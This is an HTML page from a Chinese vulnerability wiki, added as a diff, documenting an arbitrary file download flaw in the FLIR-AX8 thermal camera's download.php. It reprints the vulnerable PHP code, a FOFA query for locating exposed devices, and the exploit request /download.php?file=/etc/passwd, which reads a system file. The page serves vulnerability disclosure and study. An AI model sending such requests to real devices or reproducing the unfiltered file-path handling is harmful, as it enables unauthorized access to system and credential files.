@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/FLIR-AX8%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>FLIR-AX8 download.php 任意文件下载 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "FLIR-AX8 download.php \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../FLIR-AX8%20res.php%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../FLIR-AX8%20res.php%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        FLIR-AX8 res.php 后台命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../DrayTek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-8515/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../DrayTek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-8515/" class="btn btn-xs btn-link">
+        DrayTek企业网络设备 远程命令执行 CVE-2020-8515
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="flir-ax8-downloadphp">FLIR-AX8 download.php 任意文件下载<a class="headerlink" href="#flir-ax8-downloadphp" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>FLIR-AX8 download.php文件过滤不全 存在任意文件下载漏洞</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>FLIR-AX8
+</code></pre></div>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>app=&quot;FLIR-FLIR-AX8&quot;
+</code></pre></div>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>登录页面</p>
+<p><img alt="image-20220913103521047" src="../images/202209131035126.png" /></p>
+<p>出现漏洞的文件为 <strong>download.php</strong></p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="sd">/**</span>
+<span class="sd"> * Copyright 2012 Armand Niculescu - MediaDivision.com</span>
+<span class="sd"> * Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:</span>
+<span class="sd"> * 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.</span>
+<span class="sd"> * 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.</span>
+<span class="sd"> * THIS SOFTWARE IS PROVIDED BY THE FREEBSD PROJECT &quot;AS IS&quot; AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE FREEBSD PROJECT OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span>
+<span class="sd"> */</span>
+<span class="c1">// get the file request, throw error if nothing supplied</span>
+
+<span class="c1">// hide notices</span>
+<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;error_reporting&#39;</span><span class="p">,</span> <span class="k">E_ALL</span> <span class="o">&amp;</span> <span class="o">~</span> <span class="nx">E_NOTICE</span><span class="p">);</span>
+
+<span class="c1">//- turn off compression on the server</span>
+<span class="c1">//@apache_setenv(&#39;no-gzip&#39;, 1);</span>
+<span class="c1">//@ini_set(&#39;zlib.output_compression&#39;, &#39;Off&#39;);</span>
+
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span>
+<span class="p">{</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;HTTP/1.0 400 Bad Request&quot;</span><span class="p">);</span>
+    <span class="k">exit</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// sanitize the file request, keep just the name and extension</span>
+<span class="c1">// also, replaces the file location with a preset one (&#39;./myfiles/&#39; in this example)</span>
+<span class="nv">$file_path</span>  <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+<span class="nv">$file_type</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
+<span class="nv">$path_parts</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">);</span>
+<span class="nv">$file_name</span>  <span class="o">=</span> <span class="nv">$path_parts</span><span class="p">[</span><span class="s1">&#39;basename&#39;</span><span class="p">];</span>
+<span class="nv">$file_ext</span>   <span class="o">=</span> <span class="nv">$path_parts</span><span class="p">[</span><span class="s1">&#39;extension&#39;</span><span class="p">];</span>
+
+<span class="c1">// allow a file to be streamed instead of sent as an attachment</span>
+<span class="nv">$is_attachment</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;stream&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="k">false</span> <span class="o">:</span> <span class="k">true</span><span class="p">;</span>
+
+<span class="c1">// make sure the file exists</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">))</span>
+<span class="p">{</span>
+    <span class="nv">$file_size</span>  <span class="o">=</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">);</span>
+    <span class="nv">$file</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">,</span><span class="s2">&quot;rb&quot;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="c1">// set the headers, prevent caching</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Pragma: public&quot;</span><span class="p">);</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Expires: -1&quot;</span><span class="p">);</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-Control: public, must-revalidate, post-check=0, pre-check=0&quot;</span><span class="p">);</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Disposition: attachment; filename=</span><span class="se">\&quot;</span><span class="si">$file_name</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">);</span>
+
+        <span class="c1">// set appropriate headers for attachment or streamed file</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$is_attachment</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Disposition: attachment; filename=</span><span class="se">\&quot;</span><span class="si">$file_name</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+                <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-Disposition: inline;&#39;</span><span class="p">);</span>
+                <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-Transfer-Encoding: binary&#39;</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// set the mime type based on extension, add yours if needed.</span>
+        <span class="nv">$ctype_default</span> <span class="o">=</span> <span class="s2">&quot;application/octet-stream&quot;</span><span class="p">;</span>
+        <span class="nv">$content_types</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+                <span class="s2">&quot;exe&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;application/octet-stream&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;zip&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;application/zip&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;mp3&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;audio/mpeg&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;mpg&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;video/mpeg&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;avi&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;video/x-msvideo&quot;</span><span class="p">,</span>
+        <span class="p">);</span>
+        <span class="nv">$ctype</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$content_types</span><span class="p">[</span><span class="nv">$file_ext</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$content_types</span><span class="p">[</span><span class="nv">$file_ext</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$ctype_default</span><span class="p">;</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: &quot;</span> <span class="o">.</span> <span class="nv">$ctype</span><span class="p">);</span>
+
+        <span class="c1">//check if http_range is sent by browser (or download manager)</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_RANGE&#39;</span><span class="p">]))</span>
+        <span class="p">{</span>
+            <span class="k">list</span><span class="p">(</span><span class="nv">$size_unit</span><span class="p">,</span> <span class="nv">$range_orig</span><span class="p">)</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_RANGE&#39;</span><span class="p">],</span> <span class="mi">2</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$size_unit</span> <span class="o">==</span> <span class="s1">&#39;bytes&#39;</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="c1">//multiple ranges could be specified at the same time, but for simplicity only serve the first range</span>
+                <span class="c1">//http://tools.ietf.org/id/draft-ietf-http-range-retrieval-00.txt</span>
+                <span class="k">list</span><span class="p">(</span><span class="nv">$range</span><span class="p">,</span> <span class="nv">$extra_ranges</span><span class="p">)</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$range_orig</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="k">else</span>
+            <span class="p">{</span>
+                <span class="nv">$range</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+                <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.1 416 Requested Range Not Satisfiable&#39;</span><span class="p">);</span>
+                <span class="k">exit</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+            <span class="nv">$range</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="c1">//figure out download piece from range (if set)</span>
+        <span class="k">list</span><span class="p">(</span><span class="nv">$seek_start</span><span class="p">,</span> <span class="nv">$seek_end</span><span class="p">)</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="nv">$range</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+
+        <span class="nb">ob_clean</span><span class="p">();</span>
+
+        <span class="c1">//set start and end based on range (if set), else set defaults</span>
+        <span class="c1">//also check for invalid ranges.</span>
+        <span class="nv">$seek_end</span>   <span class="o">=</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$seek_end</span><span class="p">))</span> <span class="o">?</span> <span class="p">(</span><span class="nv">$file_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">:</span> <span class="nb">min</span><span class="p">(</span><span class="nb">abs</span><span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$seek_end</span><span class="p">)),(</span><span class="nv">$file_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">));</span>
+        <span class="nv">$seek_start</span> <span class="o">=</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$seek_start</span><span class="p">)</span> <span class="o">||</span> <span class="nv">$seek_end</span> <span class="o">&lt;</span> <span class="nb">abs</span><span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$seek_start</span><span class="p">)))</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="nb">max</span><span class="p">(</span><span class="nb">abs</span><span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$seek_start</span><span class="p">)),</span><span class="mi">0</span><span class="p">);</span>
+
+        <span class="c1">//Only send partial content header if downloading a piece of the file (IE workaround)</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$seek_start</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="nv">$seek_end</span> <span class="o">&lt;</span> <span class="p">(</span><span class="nv">$file_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.1 206 Partial Content&#39;</span><span class="p">);</span>
+            <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-Range: bytes &#39;</span><span class="o">.</span><span class="nv">$seek_start</span><span class="o">.</span><span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="nv">$seek_end</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file_size</span><span class="p">);</span>
+            <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-Length: &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$seek_end</span> <span class="o">-</span> <span class="nv">$seek_start</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+          <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Length: </span><span class="si">$file_size</span><span class="s2">&quot;</span><span class="p">);</span>
+
+        <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Accept-Ranges: bytes&#39;</span><span class="p">);</span>
+
+        <span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="nb">fseek</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$seek_start</span><span class="p">);</span>
+
+        <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> 
+        <span class="p">{</span>
+            <span class="k">print</span><span class="p">(</span><span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">8</span><span class="p">));</span>
+            <span class="nb">ob_flush</span><span class="p">();</span>
+            <span class="nb">flush</span><span class="p">();</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nb">connection_status</span><span class="p">()</span><span class="o">!=</span><span class="mi">0</span><span class="p">)</span> 
+            <span class="p">{</span>
+                <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+                <span class="k">exit</span><span class="p">;</span>
+            <span class="p">}</span>           
+        <span class="p">}</span>
+
+        <span class="c1">// file save was a success</span>
+        <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+        <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> 
+    <span class="p">{</span>
+        <span class="c1">// file couldn&#39;t be opened</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;HTTP/1.0 500 Internal Server Error&quot;</span><span class="p">);</span>
+        <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span>
+    <span class="c1">// file does not exist</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;HTTP/1.0 404 Not Found&quot;</span><span class="p">);</span>
+    <span class="k">exit</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+<p>简单审计可以发现 file参数 为可控参数且没有过滤参数，导致可以下载任意文件</p>
+<div class="highlight"><pre><span></span><code>/download.php?file=/etc/passwd
+</code></pre></div>
+<p><img alt="1662985662585-c79e5e7d-48c8-4c62-8108-0a29c34c8cac" src="../images/202209131035895.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../FLIR-AX8%20res.php%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../FLIR-AX8%20res.php%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        FLIR-AX8 res.php 后台命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../DrayTek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-8515/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../DrayTek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-8515/" class="btn btn-xs btn-link">
+        DrayTek企业网络设备 远程命令执行 CVE-2020-8515
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
